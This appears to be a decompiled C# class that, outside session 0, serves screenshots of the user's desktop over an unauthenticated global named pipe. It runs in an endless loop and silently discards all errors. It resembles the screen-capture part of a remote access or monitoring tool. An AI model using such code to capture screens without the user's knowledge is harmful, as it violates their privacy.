using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Pipes;
using System.Threading;

namespace Session1.desktop;

public class desktopManager
{
	public static void Run()
	{
		if (Process.GetCurrentProcess().SessionId == 0)
		{
			return;
		}
		ThreadPool.QueueUserWorkItem(delegate
		{
			WindowStation.SetWindowStation();
			while (true)
			{
				try
				{
					using NamedPipeServerStream namedPipeServerStream = new NamedPipeServerStream("\\\\.\\pipe\\Global\\desktopccc", PipeDirection.InOut);
					namedPipeServerStream.WaitForConnection();
					simpledesktop simpledesktop2 = new simpledesktop();
					while (true)
					{
						byte[] array = new byte[2];
						int num = namedPipeServerStream.Read(array, 0, array.Length);
						if (num == 0 || num != 2)
						{
							break;
						}
						byte[] array2 = simpledesktop2.CaptureScreenshots();
						List<byte> list = new List<byte>();
						list.AddRange(BitConverter.GetBytes(array2.Length));
						list.AddRange(array2);
						if (list.Count > 0)
						{
							namedPipeServerStream.Write(list.ToArray(), 0, list.Count);
						}
					}
				}
				catch
				{
				}
			}
		});
	}
}
